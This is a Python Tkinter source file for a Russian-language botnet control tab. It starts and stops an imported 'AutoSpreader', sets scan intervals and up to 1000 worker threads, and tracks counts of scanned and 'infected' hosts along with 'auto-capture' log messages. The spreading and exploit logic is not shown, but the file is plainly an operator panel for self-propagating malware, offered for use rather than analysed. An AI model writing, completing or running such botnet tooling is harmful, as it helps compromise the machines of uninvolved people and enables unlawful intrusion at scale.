import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import json, os, threading, queue, time
from utils.logger import log
from utils.widgets import add_copy_paste_support
from botnet.auto_spreader import AutoSpreader

class BotAutoTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.spreader = AutoSpreader()
        self.build_ui()
        self.process_messages()

    def build_ui(self):
        status_frame = ttk.Frame(self)
        status_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(status_frame, text="Статус:").pack(side=tk.LEFT)
        self.auto_status_label = ttk.Label(status_frame, text="Неактивен")
        self.auto_status_label.pack(side=tk.LEFT, padx=5)
        
        btn_frame = ttk.Frame(self)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        self.toggle_btn = ttk.Button(btn_frame, text="Запустить", command=self.toggle_spreader)
        self.toggle_btn.pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Применить настройки", command=self.reload_spreader).pack(side=tk.LEFT, padx=2)
        
        settings_frame = ttk.LabelFrame(self, text="Параметры")
        settings_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(settings_frame, text="Интервал (сек):").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.interval_var = tk.StringVar(value="30")
        interval_entry = ttk.Entry(settings_frame, textvariable=self.interval_var, width=10)
        interval_entry.grid(row=0, column=1, padx=5, sticky=tk.W)
        add_copy_paste_support(interval_entry)
        ttk.Label(settings_frame, text="Потоков:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.auto_threads_var = tk.StringVar(value="1000")
        threads_entry = ttk.Entry(settings_frame, textvariable=self.auto_threads_var, width=10)
        threads_entry.grid(row=1, column=1, padx=5, sticky=tk.W)
        add_copy_paste_support(threads_entry)
        
        stats_frame = ttk.Frame(self)
        stats_frame.pack(fill=tk.X, padx=5, pady=2)
        self.scanned_label = ttk.Label(stats_frame, text="Просканировано: 0", font=('Consolas', 9))
        self.scanned_label.pack(side=tk.LEFT, padx=10)
        self.infected_label = ttk.Label(stats_frame, text="Заражено: 0", font=('Consolas', 9))
        self.infected_label.pack(side=tk.LEFT, padx=10)
        
        self.auto_log = scrolledtext.ScrolledText(self, height=10, state=tk.NORMAL, font=('Consolas', 10))
        self.auto_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        add_copy_paste_support(self.auto_log)
        self.auto_log.tag_configure('success', foreground='#00cc00')
        self.auto_log.tag_configure('error', foreground='#ff4444')
        self.auto_log.tag_configure('warning', foreground='#ffaa00')
        self.auto_log.tag_configure('info', foreground='#cccccc')
        
        self.load_auto_settings()

    def log_to_auto(self, message):
        tag = 'info'
        lower = message.lower()
        if 'заражён' in lower or 'success' in lower or '[+]' in lower:
            tag = 'success'
        elif 'fail' in lower or 'error' in lower or 'ошибка' in lower:
            tag = 'error'
        elif 'warning' in lower:
            tag = 'warning'
        self.auto_log.insert(tk.END, message + "\n", tag)
        self.auto_log.see(tk.END)

    def update_stats_display(self, scanned=None, infected=None):
        if scanned is not None:
            self.scanned_label.config(text=f"Просканировано: {scanned}")
        if infected is not None:
            self.infected_label.config(text=f"Заражено: {infected}")

    def process_messages(self):
        try:
            while True:
                msg = self.spreader.message_queue.get_nowait()
                if msg.startswith("[Stats]"):
                    parts = msg.split('|')
                    scanned_str = parts[0].split(':')[1].strip() if ':' in parts[0] else '0'
                    infected_str = parts[1].split(':')[1].strip() if len(parts)>1 and ':' in parts[1] else '0'
                    try:
                        scanned = int(scanned_str)
                        infected = int(infected_str)
                        self.update_stats_display(scanned=scanned, infected=infected)
                    except:
                        pass
                    self.log_to_auto(msg)
                elif msg.startswith("[Progress]"):
                    pass
                else:
                    self.log_to_auto(msg)
        except queue.Empty:
            pass
        self.after(200, self.process_messages)

    def load_auto_settings(self):
        try:
            with open("avz_settings.json") as f:
                s = json.load(f)
            self.interval_var.set(str(int(s.get("auto_spread_interval_min", 30)*60)))
            self.auto_threads_var.set(str(s.get("spread_worker_threads", 1000)))
            if s.get("auto_spread_enabled"):
                self.auto_status_label.config(text="Активен")
                self.toggle_btn.config(text="Остановить")
        except: pass

    def toggle_spreader(self):
        if self.spreader.running:
            self.spreader.stop()
            self.auto_status_label.config(text="Неактивен")
            self.toggle_btn.config(text="Запустить")
        else:
            self.save_auto_settings()
            self.spreader.load_settings("avz_settings.json")
            self.spreader.start()
            self.auto_status_label.config(text="Активен")
            self.toggle_btn.config(text="Остановить")

    def save_auto_settings(self):
        try:
            with open("avz_settings.json","r") as f:
                s = json.load(f)
        except:
            s = {}
        s["auto_spread_interval_min"] = int(self.interval_var.get()) / 60
        s["spread_worker_threads"] = int(self.auto_threads_var.get())
        s["auto_spread_enabled"] = True
        with open("avz_settings.json","w") as f:
            json.dump(s, f, indent=2)

    def reload_spreader(self):
        self.save_auto_settings()
        self.spreader.load_settings("avz_settings.json")
        self.log_to_auto("[Автозахват] Настройки обновлены")
